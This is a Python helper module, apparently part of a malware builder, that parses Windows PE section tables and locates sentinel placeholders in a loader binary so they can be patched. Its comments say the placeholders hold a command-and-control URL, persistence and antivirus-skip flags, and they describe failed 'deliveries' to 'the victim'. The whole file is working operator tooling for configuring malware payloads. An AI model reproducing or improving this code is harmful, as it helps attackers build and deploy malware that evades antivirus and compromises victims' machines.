# peutil.py -- PE helpers shared by auto.py and pick.py.
#
# Why this exists: the loader declares one writable global per sentinel
# (g_c2_url[256], g_persist[8], g_skip_av[8]) AND a local copy of the same
# literal used by memcmp() at runtime. The compiler puts the global in .data
# and the literal in .rdata, and .rdata comes FIRST in the file. A plain
# bytes.find() therefore patched the comparison constant, not the global:
# memcmp stopped matching, the payload kept its sentinel, and the victim fell
# back to the local file. Zero deliveries, no error message.
import struct

MZ = b"MZ"
PE = b"PE\0\0"


def sections(blob):
    """[(name, va, vsize, raw_ptr, raw_size)] or [] when blob is not a PE."""
    try:
        if blob[:2] != MZ:
            return []
        pe = struct.unpack_from("<I", blob, 0x3C)[0]
        if blob[pe:pe + 4] != PE:
            return []
        nsec = struct.unpack_from("<H", blob, pe + 6)[0]
        optsz = struct.unpack_from("<H", blob, pe + 20)[0]
        off = pe + 24 + optsz
        out = []
        for i in range(nsec):
            o = off + i * 40
            name = blob[o:o + 8].rstrip(b"\0").decode("ascii", "replace")
            vsize, va, rsize, rptr = struct.unpack_from("<IIII", blob, o + 8)
            out.append((name, va, vsize, rptr, rsize))
        return out
    except (struct.error, IndexError):
        return []


def _inside(secs, offset, name):
    for sname, _va, _vs, rptr, rsize in secs:
        if sname == name and rptr <= offset < rptr + rsize:
            return True
    return False


def find_sentinel(blob, sentinel, slot=None, section=".data"):
    """Return the offset of the sentinel that belongs to a writable global.

    The same literal also exists as a memcmp() constant and, for the 8-byte
    flags, as an immediate inside .text. Preference order:
      1. the occurrence followed by slot-len(sentinel) zero bytes (the array);
      2. a writable global: .data, then .rdata, then anything but .text;
      3. the first hit.
    Returns -1 when the sentinel is absent.
    """
    hits, i = [], blob.find(sentinel)
    while i != -1:
        hits.append(i)
        i = blob.find(sentinel, i + 1)
    if not hits:
        return -1
    if slot and slot > len(sentinel):
        pad = slot - len(sentinel)
        for h in hits:
            if blob[h + len(sentinel):h + slot] == b"\0" * pad:
                return h
    secs = sections(blob)

    def rank(h):
        name = None
        for sname, _va, _vs, rptr, rsize in secs:
            if rptr <= h < rptr + rsize:
                name = sname
                break
        if name == section:
            return 0
        if name == ".rdata":
            return 1
        if name == ".text":
            return 3
        return 1 if name else 2      # not a PE / unknown section: neutral
    return min(hits, key=lambda h: (rank(h), h))
